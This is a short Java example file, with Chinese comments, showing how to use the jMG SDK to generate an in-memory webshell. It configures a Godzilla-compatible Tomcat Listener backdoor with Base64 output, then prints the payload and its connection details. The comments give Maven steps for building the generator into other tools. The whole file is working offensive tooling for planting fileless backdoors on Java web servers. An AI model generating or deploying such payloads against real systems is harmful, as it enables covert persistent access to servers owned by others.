import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;
import jmg.sdk.jMGenerator;
import jmg.sdk.util.SDKResultUtil;

/*
1、将 java-memshell-generator 和 jmg-sdk 安装到本地 maven 仓库
    1) mvn install:install-file -Dfile=java-memshell-generator-<version>-jar-with-dependencies -DgroupId=jmg -DartifactId=java-memshell-generator -Dversion=<version> -Dpackaging=jar
    2) mvn install:install-file -Dfile=jmg-sdk-<version>-jar-with-dependencies.jar -DgroupId=jmg -DartifactId=jmg-sdk -Dversion=<version> -Dpackaging=jar

2、引入自己的框架/工具的依赖中
    <dependency>
        <groupId>jmg</groupId>
        <artifactId>jmg-sdk</artifactId>
        <version>1.0.8</version>
    </dependency>

 */
public class SDKTest {
    public static void main(String[] args) throws Throwable {
        // 必需的基础配置
        AbstractConfig config = new AbstractConfig() {{
            // 设置工具类型
            setToolType(Constants.TOOL_GODZILLA);
            // 设置中间件 or 框架
            setServerType(Constants.SERVER_TOMCAT);
            // 设置内存马类型
            setShellType(Constants.SHELL_LISTENER);
            // 设置输出格式为 BASE64
            setOutputFormat(Constants.FORMAT_BASE64);
            // 设置漏洞利用封装，默认不启用
            setGadgetType(Constants.GADGET_NONE);
            // 初始化基础配置
            build();
        }};

        jMGenerator generator = new jMGenerator(config);
        generator.genPayload();
        generator.printPayload();

        // 连接信息
        SDKResultUtil.printBasicInfo(config);
        SDKResultUtil.printDebugInfo(config);
    }
}
